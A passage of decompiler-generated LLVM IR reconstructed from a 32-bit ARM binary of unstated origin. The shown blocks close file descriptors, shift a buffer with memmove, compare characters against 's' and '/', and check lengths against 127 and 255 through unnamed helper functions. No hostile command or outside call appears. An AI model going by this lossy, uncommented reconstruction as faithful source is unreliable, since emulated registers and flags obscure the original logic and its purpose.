  %v4_a5e4 = sub i32 10239, %v0_a5e4
  %v5_a5e4 = and i32 %v4_a5e4, %v0_a5e4
  %v6_a5e4 = icmp slt i32 %v5_a5e4, 0
  store i1 %v6_a5e4, i1* %cpsr_v.global-to-local, align 1
  %v7_a5e4 = icmp slt i32 %v2_a5e4, 0
  store i1 %v7_a5e4, i1* %cpsr_n.global-to-local, align 1
  %v8_a5e4 = icmp eq i32 %v0_a5e4, 10240
  store i1 %v8_a5e4, i1* %cpsr_z.global-to-local, align 1
  %v5_a5e8 = icmp slt i32 %v0_a5e4, 10240
  br i1 %v5_a5e8, label %dec_label_pc_9508, label %dec_label_pc_9af0

dec_label_pc_a5f0:                                ; preds = %dec_label_pc_a2f8
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a5f4 = load i32, i32* @r4, align 4
  %v2_a5f4 = inttoptr i32 %v1_a5f4 to i32*
  store i32 104, i32* %v2_a5f4, align 4
  br label %dec_label_pc_a32c

dec_label_pc_a5fc:                                ; preds = %dec_label_pc_a100
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a600 = load i32, i32* %fp.global-to-local, align 4
  %v2_a600 = inttoptr i32 %v1_a600 to i32*
  store i32 104, i32* %v2_a600, align 4
  br label %dec_label_pc_a604

dec_label_pc_a604:                                ; preds = %dec_label_pc_a620, %dec_label_pc_a5fc
  %v0_a604 = load i32, i32* @r8, align 4
  %v1_a604 = add i32 %v0_a604, -1456
  %v2_a604 = inttoptr i32 %v1_a604 to i32*
  %v3_a604 = load i32, i32* %v2_a604, align 4
  store i32 %v3_a604, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @close(i32 %v3_a604)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a614 = load i32, i32* @r8, align 4
  %v2_a614 = add i32 %v1_a614, -1456
  %v3_a614 = inttoptr i32 %v2_a614 to i32*
  store i32 -1, i32* %v3_a614, align 4
  %v0_a618 = load i32, i32* %lr.global-to-local, align 4
  %v1_a618 = trunc i32 %v0_a618 to i8
  %v2_a618 = load i32, i32* @r8, align 4
  %v3_a618 = add i32 %v2_a618, -1452
  %v4_a618 = inttoptr i32 %v3_a618 to i8*
  store i8 %v1_a618, i8* %v4_a618, align 1
  br label %dec_label_pc_9508

dec_label_pc_a620:                                ; preds = %dec_label_pc_a128
  %v0_a620 = load i32, i32* %fp.global-to-local, align 4
  %v1_a620 = inttoptr i32 %v0_a620 to i32*
  %v2_a620 = load i32, i32* %v1_a620, align 4
  store i32 %v2_a620, i32* %r3.global-to-local, align 4
  %v1_a624 = add i32 %v2_a620, -11
  %v2_a624 = icmp ugt i32 %v2_a620, 10
  store i1 %v2_a624, i1* %cpsr_c.global-to-local, align 1
  %v3_a624 = sub i32 10, %v2_a620
  %v4_a624 = and i32 %v3_a624, %v2_a620
  %v5_a624 = icmp slt i32 %v4_a624, 0
  store i1 %v5_a624, i1* %cpsr_v.global-to-local, align 1
  %v6_a624 = icmp slt i32 %v1_a624, 0
  store i1 %v6_a624, i1* %cpsr_n.global-to-local, align 1
  %v7_a624 = icmp eq i32 %v2_a620, 11
  store i1 %v7_a624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a624, label %dec_label_pc_9508, label %dec_label_pc_a604

dec_label_pc_a630:                                ; preds = %bb236
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_a63c = load i32, i32* @r5, align 4
  %v1_a63c = add i32 %v0_a63c, 4
  %v2_a63c = inttoptr i32 %v1_a63c to i8*
  %v3_a63c = load i8, i8* %v2_a63c, align 1
  %v4_a63c = zext i8 %v3_a63c to i32
  store i32 %v4_a63c, i32* %r3.global-to-local, align 4
  %v2_a640 = icmp ugt i8 %v3_a63c, 114
  store i1 %v2_a640, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a640 = icmp ult i8 %v3_a63c, 115
  store i1 %v6_a640, i1* %cpsr_n.global-to-local, align 1
  %v7_a640 = icmp eq i8 %v3_a63c, 115
  store i1 %v7_a640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a640, label %bb241, label %.thread64

bb241:                                            ; preds = %dec_label_pc_a630
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread64

.thread64:                                        ; preds = %dec_label_pc_a630, %bb241
  %v3_a650 = phi i32 [ 7, %dec_label_pc_a630 ], [ 8, %bb241 ]
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  store i32 %v0_a63c, i32* %r0.global-to-local, align 4
  %v1_a658 = load i32, i32* %r6.global-to-local, align 4
  %v2_a658 = sub i32 %v1_a658, %v3_a650
  store i32 %v2_a658, i32* %r2.global-to-local, align 4
  %v2_a65c = add i32 %v3_a650, %v0_a63c
  store i32 %v2_a65c, i32* %r1.global-to-local, align 4
  %v3_a660 = inttoptr i32 %v0_a63c to i32*
  %v4_a660 = inttoptr i32 %v2_a65c to i32*
  %v5_a660 = call i32* @memmove(i32* %v3_a660, i32* %v4_a660, i32 %v2_a658)
  %v7_a660 = ptrtoint i32* %v5_a660 to i32
  store i32 %v7_a660, i32* %r0.global-to-local, align 4
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  %v0_a668 = load i32, i32* @r7, align 4
  store i32 %v0_a668, i32* %stack_var_-40, align 4
  store i32 %v2_8f50, i32* %r1.global-to-local, align 4
  %v1_a670 = load i32, i32* @r4, align 4
  %v2_a670 = add i32 %v1_a670, %v2_8f50
  %v3_a670 = inttoptr i32 %v2_a670 to i8*
  %v4_a670 = load i8, i8* %v3_a670, align 1
  %v6_a670 = zext i8 %v4_a670 to i32
  store i32 %v6_a670, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a674 = icmp eq i8 %v4_a670, 0
  store i1 %v2_a674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a674, label %dec_label_pc_a6b8, label %dec_label_pc_a67c

dec_label_pc_a67c:                                ; preds = %.thread64
  %v2_a67c = icmp ugt i8 %v4_a670, 46
  store i1 %v2_a67c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a67c = icmp ult i8 %v4_a670, 47
  store i1 %v6_a67c, i1* %cpsr_n.global-to-local, align 1
  %v7_a67c = icmp eq i8 %v4_a670, 47
  store i1 %v7_a67c, i1* %cpsr_z.global-to-local, align 1
  %v1_a680 = load i32, i32* @r5, align 4
  br i1 %v7_a67c, label %bb242, label %dec_label_pc_a688

bb242:                                            ; preds = %dec_label_pc_a67c
  store i32 %v1_a680, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a818

dec_label_pc_a688:                                ; preds = %dec_label_pc_a67c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a698

dec_label_pc_a690:                                ; preds = %dec_label_pc_a698
  %v2_a690 = icmp ugt i8 %v4_a6a4, 46
  store i1 %v2_a690, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a690 = icmp ult i8 %v4_a6a4, 47
  store i1 %v6_a690, i1* %cpsr_n.global-to-local, align 1
  %v7_a690 = icmp eq i8 %v4_a6a4, 47
  store i1 %v7_a690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a690, label %dec_label_pc_a818, label %dec_label_pc_a698

dec_label_pc_a698:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a688
  %v0_a6ac = phi i32 [ %v1_a6ac, %dec_label_pc_a690 ], [ 1, %dec_label_pc_a688 ]
  store i32 %v0_a6ac, i32* %ip.global-to-local, align 4
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  store i32 %v0_a6ac, i32* %stack_var_-40, align 4
  %v2_a6a4 = add i32 %v0_a6ac, %v1_a680
  %v3_a6a4 = inttoptr i32 %v2_a6a4 to i8*
  %v4_a6a4 = load i8, i8* %v3_a6a4, align 1
  %v6_a6a4 = zext i8 %v4_a6a4 to i32
  store i32 %v6_a6a4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a6a8 = icmp eq i8 %v4_a6a4, 0
  store i1 %v2_a6a8, i1* %cpsr_z.global-to-local, align 1
  %v1_a6ac = add i32 %v0_a6ac, 1
  store i32 %v1_a6ac, i32* %r3.global-to-local, align 4
  store i32 %v2_a6a4, i32* %r1.global-to-local, align 4
  br i1 %v2_a6a8, label %dec_label_pc_a6b8, label %dec_label_pc_a690

dec_label_pc_a6b8:                                ; preds = %dec_label_pc_a698, %.thread64, %dec_label_pc_a818
  %v0_a6b8 = load i32, i32* @r5, align 4
  store i32 %v0_a6b8, i32* %r0.global-to-local, align 4
  %v1_a6bc = inttoptr i32 %v0_a6b8 to i8*
  %v2_a6bc = call i32 @function_12d34(i8* %v1_a6bc)
  store i32 %v2_a6bc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a6c0 = icmp slt i32 %v2_a6bc, 0
  store i1 %v1_a6c0, i1* %cpsr_n.global-to-local, align 1
  %v2_a6c0 = icmp eq i32 %v2_a6bc, 0
  store i1 %v2_a6c0, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp slt i32 %v2_a6bc, 1
  br i1 %tmp243, label %dec_label_pc_a6e4, label %dec_label_pc_a6c8

dec_label_pc_a6c8:                                ; preds = %dec_label_pc_a6b8
  %v0_a6c8 = load i32, i32* @r5, align 4
  store i32 %v0_a6c8, i32* %r0.global-to-local, align 4
  %v1_a6cc = inttoptr i32 %v0_a6c8 to i8*
  %v2_a6cc = call i32 @function_12d34(i8* %v1_a6cc)
  store i32 %v2_a6cc, i32* %r0.global-to-local, align 4
  %v1_a6d0 = add i32 %v2_a6cc, -127
  %v2_a6d0 = icmp ugt i32 %v2_a6cc, 126
  store i1 %v2_a6d0, i1* %cpsr_c.global-to-local, align 1
  %v3_a6d0 = sub i32 126, %v2_a6cc
  %v4_a6d0 = and i32 %v3_a6d0, %v2_a6cc
  %v5_a6d0 = icmp slt i32 %v4_a6d0, 0
  store i1 %v5_a6d0, i1* %cpsr_v.global-to-local, align 1
  %v6_a6d0 = icmp slt i32 %v1_a6d0, 0
  store i1 %v6_a6d0, i1* %cpsr_n.global-to-local, align 1
  %v7_a6d0 = icmp eq i32 %v2_a6cc, 127
  store i1 %v7_a6d0, i1* %cpsr_z.global-to-local, align 1
  %v7_a6d4 = icmp sgt i32 %v2_a6cc, 127
  br i1 %v7_a6d4, label %.thread67, label %bb244

bb244:                                            ; preds = %dec_label_pc_a6c8
  %v8_a6d4 = load i32, i32* %sb.global-to-local, align 4
  %v9_a6d8 = add i32 %v8_a6d4, 789
  store i32 %v9_a6d8, i32* %r0.global-to-local, align 4
  %v8_a6dc = load i32, i32* @r5, align 4
  store i32 %v8_a6dc, i32* %r1.global-to-local, align 4
  br label %.thread67

.thread67:                                        ; preds = %dec_label_pc_a6c8, %bb244
  store i32 42724, i32* %lr.global-to-local, align 4
  %v3_a6e0 = xor i1 %v6_a6d0, %v5_a6d0
  %v4_a6e0 = or i1 %v7_a6d0, %v3_a6e0
  call void @__pseudo_cond_branch(i1 %v4_a6e0, i32 ptrtoint (i32* @global_var_12d5c.101 to i32))
  br label %dec_label_pc_a6e4

dec_label_pc_a6e4:                                ; preds = %dec_label_pc_a6b8, %.thread67
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v3_a6e8 = load i32, i32* %stack_var_-40, align 4
  %v0_a6ec = load i32, i32* @r5, align 4
  %v2_a6ec = add i32 %v3_a6e8, 1
  %v1_a6f0 = add i32 %v2_a6ec, %v0_a6ec
  store i32 %v1_a6f0, i32* %r0.global-to-local, align 4
  %v1_a6f4 = inttoptr i32 %v1_a6f0 to i8*
  %v2_a6f4 = call i32 @function_12d34(i8* %v1_a6f4)
  store i32 %v2_a6f4, i32* %r0.global-to-local, align 4
  %v1_a6f8 = add i32 %v2_a6f4, -255
  %v2_a6f8 = icmp ugt i32 %v2_a6f4, 254
  store i1 %v2_a6f8, i1* %cpsr_c.global-to-local, align 1
  %v3_a6f8 = sub i32 254, %v2_a6f4
  %v4_a6f8 = and i32 %v3_a6f8, %v2_a6f4
  %v5_a6f8 = icmp slt i32 %v4_a6f8, 0
  store i1 %v5_a6f8, i1* %cpsr_v.global-to-local, align 1
  %v6_a6f8 = icmp slt i32 %v1_a6f8, 0
  store i1 %v6_a6f8, i1* %cpsr_n.global-to-local, align 1
  %v7_a6f8 = icmp eq i32 %v2_a6f4, 255
  store i1 %v7_a6f8, i1* %cpsr_z.global-to-local, align 1
  %v8_a6fc = icmp sgt i32 %v2_a6f4, 255
  br i1 %v8_a6fc, label %dec_label_pc_a0d0, label %dec_label_pc_a700

dec_label_pc_a700:                                ; preds = %dec_label_pc_a6e4
  %v0_a700 = load i32, i32* %sb.global-to-local, align 4
  %v1_a704 = add i32 %v0_a700, 533
  store i32 %v1_a704, i32* @r4, align 4
  store i32 %v1_a704, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a710 = call i32 @function_12dd4(i32 %v1_a704, i32 255)
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  %v3_a718 = load i32, i32* %stack_var_-40, align 4
  %v0_a71c = load i32, i32* @r5, align 4
  %v2_a71c = add i32 %v3_a718, 1
  %v1_a720 = add i32 %v2_a71c, %v0_a71c
  store i32 %v1_a720, i32* %r0.global-to-local, align 4
  %v1_a724 = inttoptr i32 %v1_a720 to i8*
  %v2_a724 = call i32 @function_12d34(i8* %v1_a724)
  store i32 %v2_a724, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a728 = icmp slt i32 %v2_a724, 0
  store i1 %v1_a728, i1* %cpsr_n.global-to-local, align 1
  %v2_a728 = icmp eq i32 %v2_a724, 0
  store i1 %v2_a728, i1* %cpsr_z.global-to-local, align 1
  %tmp245 = icmp slt i32 %v2_a724, 1
  br i1 %tmp245, label %dec_label_pc_a0d0, label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a700
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  %v3_a734 = load i32, i32* %stack_var_-40, align 4
  %v0_a738 = load i32, i32* @r5, align 4
  %v0_a73c = load i32, i32* @r4, align 4
  store i32 %v0_a73c, i32* @r0, align 4
  %v2_a738 = add i32 %v3_a734, 1
  %v1_a740 = add i32 %v2_a738, %v0_a738
  store i32 %v1_a740, i32* %r1.global-to-local, align 4
  %v2_a744 = inttoptr i32 %v0_a73c to i8*
  %v3_a744 = call i32 @function_12d5c(i8* %v2_a744, i32 %v1_a740)
  store i32 %v3_a744, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0d0

dec_label_pc_a74c:                                ; preds = %dec_label_pc_9aa0
  %v0_a74c = load i32, i32* @r8, align 4
  %v1_a74c = add i32 %v0_a74c, -1456
  %v2_a74c = inttoptr i32 %v1_a74c to i32*
  %v3_a74c = load i32, i32* %v2_a74c, align 4
  store i32 %v3_a74c, i32* %r0.global-to-local, align 4
  %v1_a750 = call i32 @close(i32 %v3_a74c)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a75c = load i32, i32* @r8, align 4
  %v2_a75c = add i32 %v1_a75c, -1456
  %v3_a75c = inttoptr i32 %v2_a75c to i32*
  store i32 -1, i32* %v3_a75c, align 4
  %v0_a760 = load i32, i32* %r3.global-to-local, align 4
  %v1_a760 = trunc i32 %v0_a760 to i8
  %v2_a760 = load i32, i32* @r8, align 4
  %v3_a760 = add i32 %v2_a760, -1452
  %v4_a760 = inttoptr i32 %v3_a760 to i8*
  store i8 %v1_a760, i8* %v4_a760, align 1
  br label %dec_label_pc_9508

dec_label_pc_a768:                                ; preds = %dec_label_pc_a320
  %v0_a768 = load i32, i32* @r8, align 4
  %v1_a768 = add i32 %v0_a768, -1452
  %v2_a768 = inttoptr i32 %v1_a768 to i8*
  %v3_a768 = load i8, i8* %v2_a768, align 1
  %v4_a768 = zext i8 %v3_a768 to i32
  store i32 %v4_a768, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a76c = icmp eq i8 %v3_a768, 0
  store i1 %v2_a76c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a76c, label %dec_label_pc_9508, label %dec_label_pc_a0d0

dec_label_pc_a778:                                ; preds = %dec_label_pc_a590
  %v0_a778 = load i32, i32* @r4, align 4
  store i32 %v0_a778, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_13694.73 to i32), i32* %r1.global-to-local, align 4
  %v2_a780 = inttoptr i32 %v0_a778 to i8*
  %v3_a780 = call i32 @function_13114(i8* %v2_a780, i32 ptrtoint ([4 x i8]* @global_var_13694.73 to i32))
  store i32 %v3_a780, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a784 = icmp slt i32 %v3_a780, 0
  store i1 %v1_a784, i1* %cpsr_n.global-to-local, align 1
  %v2_a784 = icmp eq i32 %v3_a780, 0
  store i1 %v2_a784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a784, label %bb246, label %dec_label_pc_a5c4

bb246:                                            ; preds = %dec_label_pc_a778
  %v0_a78c = load i32, i32* %fp.global-to-local, align 4
  %v1_a78c = load i32, i32* @r5, align 4
  %v2_a78c = sub i32 %v0_a78c, %v1_a78c
  %v3_a78c = icmp uge i32 %v0_a78c, %v1_a78c
  store i1 %v3_a78c, i1* %cpsr_c.global-to-local, align 1
  %v4_a78c = xor i32 %v1_a78c, %v0_a78c
  %v5_a78c = xor i32 %v2_a78c, %v0_a78c
  %v6_a78c = and i32 %v5_a78c, %v4_a78c
  %v7_a78c = icmp slt i32 %v6_a78c, 0
  store i1 %v7_a78c, i1* %cpsr_v.global-to-local, align 1
  %v8_a78c = icmp slt i32 %v2_a78c, 0
  store i1 %v8_a78c, i1* %cpsr_n.global-to-local, align 1
  %v9_a78c = icmp eq i32 %v0_a78c, %v1_a78c
  store i1 %v9_a78c, i1* %cpsr_z.global-to-local, align 1
  %v7_a790 = icmp sgt i32 %v0_a78c, %v1_a78c
  %. = select i1 %v7_a790, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_a798 = trunc i32 %. to i8
  %v10_a798 = load i32, i32* @r8, align 4
  %v11_a798 = add i32 %v10_a798, -1452
  %v12_a798 = inttoptr i32 %v11_a798 to i8*
  store i8 %v9_a798, i8* %v12_a798, align 1
  br label %dec_label_pc_a5cc

dec_label_pc_a7a4:                                ; preds = %dec_label_pc_a218
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v0_a7ac = load i32, i32* @r8, align 4
  %v1_a7ac = add i32 %v0_a7ac, 656
  %v2_a7ac = inttoptr i32 %v1_a7ac to i32*
  %v3_a7ac = load i32, i32* %v2_a7ac, align 4
  store i32 %v3_a7ac, i32* @r4, align 4
  %v3_a7b0 = call i32 @function_1219c(i32 43, i32* null)
  %v0_a7b4 = load i32, i32* @r4, align 4
  store i32 %v0_a7b4, i32* %r1.global-to-local, align 4
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a7c0 = load i32, i32* @r7, align 4
  store i32 %v0_a7c0, i32* %r0.global-to-local, align 4
  %v4_a7c4 = call i32 @function_12df8(i32 %v0_a7c0, i32 %v0_a7b4, i32 %v3_a7b0, i32 11)
  store i32 %v4_a7c4, i32* %r0.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @r8, align 4
  %v1_a7c8 = add i32 %v0_a7c8, 656
  %v2_a7c8 = inttoptr i32 %v1_a7c8 to i32*
  %v3_a7c8 = load i32, i32* %v2_a7c8, align 4
  %v0_a7cc = load i32, i32* @r7, align 4
  %v2_a7cc = add i32 %v0_a7cc, %v4_a7c4
  store i32 %v2_a7cc, i32* @r5, align 4
  store i32 %v4_a7c4, i32* @r4, align 4
  %v2_a7d4 = sub i32 %v3_a7c8, %v4_a7c4
  store i32 %v2_a7d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136d0.103 to i32), i32* %r2.global-to-local, align 4
  %v0_a7dc = load i32, i32* @sl, align 4
  store i32 %v0_a7dc, i32* %r3.global-to-local, align 4
  store i32 %v2_a7cc, i32* %r0.global-to-local, align 4
  %v4_a7e4 = call i32 @function_12df8(i32 %v2_a7cc, i32 %v2_a7d4, i32 ptrtoint (i32* @global_var_136d0.103 to i32), i32 %v0_a7dc)
  store i32 %v4_a7e4, i32* %r0.global-to-local, align 4
  %v0_a7e8 = load i32, i32* @r8, align 4
  %v1_a7e8 = add i32 %v0_a7e8, 12
  %v2_a7e8 = inttoptr i32 %v1_a7e8 to i32*
  %v3_a7e8 = load i32, i32* %v2_a7e8, align 4
  store i32 %v3_a7e8, i32* %r3.global-to-local, align 4
  %v0_a7ec = load i32, i32* @r4, align 4
  %v2_a7ec = add i32 %v0_a7ec, %v4_a7e4
  store i32 %v2_a7ec, i32* %r6.global-to-local, align 4
  %v1_a7f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_a7f0 = add i32 %v1_a7f0, %v2_a7ec
  store i32 %v2_a7f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v1_a7f8 = add i32 %v3_a7e8, -4
  %v2_a7f8 = icmp ugt i32 %v3_a7e8, 3
  store i1 %v2_a7f8, i1* %cpsr_c.global-to-local, align 1
  %v3_a7f8 = sub i32 3, %v3_a7e8
  %v4_a7f8 = and i32 %v3_a7f8, %v3_a7e8
  %v5_a7f8 = icmp slt i32 %v4_a7f8, 0
  store i1 %v5_a7f8, i1* %cpsr_v.global-to-local, align 1
  %v6_a7f8 = icmp slt i32 %v1_a7f8, 0
  store i1 %v6_a7f8, i1* %cpsr_n.global-to-local, align 1
  %v7_a7f8 = icmp eq i32 %v3_a7e8, 4
  store i1 %v7_a7f8, i1* %cpsr_z.global-to-local, align 1
  %v3_a7fc = add i32 %v2_a7f0, 2115
  %v4_a7fc = inttoptr i32 %v3_a7fc to i8*
  store i8 0, i8* %v4_a7fc, align 1
  %v7_a800 = icmp sgt i32 %v3_a7e8, 4
  br i1 %v7_a800, label %dec_label_pc_a804, label %dec_label_pc_a88c

dec_label_pc_a804:                                ; preds = %dec_label_pc_a7a4, %dec_label_pc_a88c, %dec_label_pc_a89c
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a80c = load i32, i32* @r8, align 4
  %v2_a80c = add i32 %v1_a80c, 8
  %v3_a80c = inttoptr i32 %v2_a80c to i32*
  store i32 -1, i32* %v3_a80c, align 4
  %v0_a810 = load i32, i32* %r3.global-to-local, align 4
  %v1_a810 = trunc i32 %v0_a810 to i8
  %v2_a810 = load i32, i32* @r8, align 4
  %v3_a810 = add i32 %v2_a810, -1452
  %v4_a810 = inttoptr i32 %v3_a810 to i8*
  store i8 %v1_a810, i8* %v4_a810, align 1
  br label %dec_label_pc_9508

dec_label_pc_a818:                                ; preds = %dec_label_pc_a690, %bb242
  %v2_a81c = phi i32 [ %v1_a680, %bb242 ], [ %v2_a6a4, %dec_label_pc_a690 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a81c = inttoptr i32 %v2_a81c to i8*
  store i8 0, i8* %v3_a81c, align 1
  br label %dec_label_pc_a6b8

dec_label_pc_a824:                                ; preds = %dec_label_pc_a0c0
  %v0_a824 = load i32, i32* %sb.global-to-local, align 4
  %v1_a828 = add i32 %v0_a824, 533
  store i32 %v1_a828, i32* @r4, align 4
  store i32 %v1_a828, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a834 = call i32 @function_12dd4(i32 %v1_a828, i32 255)
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  %v3_a83c = load i32, i32* %stack_var_-40, align 4
  %v0_a840 = load i32, i32* @r5, align 4
  %v2_a840 = add i32 %v3_a83c, 1
  %v1_a844 = add i32 %v2_a840, %v0_a840
  store i32 %v1_a844, i32* %r0.global-to-local, align 4
  %v1_a848 = inttoptr i32 %v1_a844 to i8*
  %v2_a848 = call i32 @function_12d34(i8* %v1_a848)
  store i32 %v2_a848, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a84c = icmp slt i32 %v2_a848, 0
  store i1 %v1_a84c, i1* %cpsr_n.global-to-local, align 1
  %v2_a84c = icmp eq i32 %v2_a848, 0
  store i1 %v2_a84c, i1* %cpsr_z.global-to-local, align 1
  %tmp247 = icmp slt i32 %v2_a848, 1
  br i1 %tmp247, label %dec_label_pc_a0d0, label %dec_label_pc_a854

dec_label_pc_a854:                                ; preds = %dec_label_pc_a824
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v3_a858 = load i32, i32* %stack_var_-40, align 4
  %v0_a85c = load i32, i32* @r5, align 4
  %v2_a85c = add i32 %v3_a858, 1
  %v1_a860 = add i32 %v2_a85c, %v0_a85c
  store i32 %v1_a860, i32* %r0.global-to-local, align 4
  %v1_a864 = inttoptr i32 %v1_a860 to i8*
  %v2_a864 = call i32 @function_12d34(i8* %v1_a864)
  store i32 %v2_a864, i32* %r0.global-to-local, align 4
  %v1_a868 = add i32 %v2_a864, -255
  %v2_a868 = icmp ugt i32 %v2_a864, 254
  store i1 %v2_a868, i1* %cpsr_c.global-to-local, align 1
  %v3_a868 = sub i32 254, %v2_a864
  %v4_a868 = and i32 %v3_a868, %v2_a864
  %v5_a868 = icmp slt i32 %v4_a868, 0
  store i1 %v5_a868, i1* %cpsr_v.global-to-local, align 1
  %v6_a868 = icmp slt i32 %v1_a868, 0
  store i1 %v6_a868, i1* %cpsr_n.global-to-local, align 1
  %v7_a868 = icmp eq i32 %v2_a864, 255
  store i1 %v7_a868, i1* %cpsr_z.global-to-local, align 1
  %v8_a86c = icmp sgt i32 %v2_a864, 255
  br i1 %v8_a86c, label %dec_label_pc_a0d0, label %dec_label_pc_a870

dec_label_pc_a870:                                ; preds = %dec_label_pc_a854
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  %v3_a874 = load i32, i32* %stack_var_-40, align 4
  %v0_a878 = load i32, i32* @r5, align 4
  %v0_a87c = load i32, i32* @r4, align 4
  store i32 %v0_a87c, i32* @r0, align 4
  %v2_a878 = add i32 %v3_a874, 1
  %v1_a880 = add i32 %v2_a878, %v0_a878
  store i32 %v1_a880, i32* %r1.global-to-local, align 4
  %v2_a884 = inttoptr i32 %v0_a87c to i8*
  %v3_a884 = call i32 @function_12d5c(i8* %v2_a884, i32 %v1_a880)
  store i32 %v3_a884, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0d0

dec_label_pc_a88c:                                ; preds = %dec_label_pc_a7a4
  %v0_a88c = load i32, i32* @r5, align 4
  store i32 %v0_a88c, i32* %r0.global-to-local, align 4
  %v1_a890 = inttoptr i32 %v0_a88c to i8*
  %v2_a890 = call i32 @function_12d34(i8* %v1_a890)
  store i32 %v2_a890, i32* %r0.global-to-local, align 4
  %v1_a894 = add i32 %v2_a890, -127
  %v2_a894 = icmp ugt i32 %v2_a890, 126
  store i1 %v2_a894, i1* %cpsr_c.global-to-local, align 1
  %v3_a894 = sub i32 126, %v2_a890
  %v4_a894 = and i32 %v3_a894, %v2_a890
  %v5_a894 = icmp slt i32 %v4_a894, 0
  store i1 %v5_a894, i1* %cpsr_v.global-to-local, align 1
  %v6_a894 = icmp slt i32 %v1_a894, 0
  store i1 %v6_a894, i1* %cpsr_n.global-to-local, align 1
  %v7_a894 = icmp eq i32 %v2_a890, 127
  store i1 %v7_a894, i1* %cpsr_z.global-to-local, align 1
  %v8_a898 = icmp sgt i32 %v2_a890, 127
  br i1 %v8_a898, label %dec_label_pc_a804, label %dec_label_pc_a89c

dec_label_pc_a89c:                                ; preds = %dec_label_pc_a88c
  %v0_a89c = load i32, i32* @r8, align 4
  %v1_a89c = add i32 %v0_a89c, 12
  %v2_a89c = inttoptr i32 %v1_a89c to i32*
  %v3_a89c = load i32, i32* %v2_a89c, align 4
  store i32 %v1_a0e0, i32* %r2.global-to-local, align 4
  %v1_a8a4 = and i32 %v3_a89c, 33554432
  %v2_a8a4 = icmp ne i32 %v1_a8a4, 0
  store i1 %v2_a8a4, i1* %cpsr_c.global-to-local, align 1
  %v3_a8a4 = mul i32 %v3_a89c, 128
  %v0_a8a8 = load i32, i32* @r5, align 4
  store i32 %v0_a8a8, i32* %r1.global-to-local, align 4
  %v2_a8ac = add i32 %v3_a8a4, %v1_a0e0
  store i32 %v2_a8ac, i32* @r0, align 4
  %v2_a8b0 = inttoptr i32 %v2_a8ac to i8*
  %v3_a8b0 = call i32 @function_12d5c(i8* %v2_a8b0, i32 %v0_a8a8)
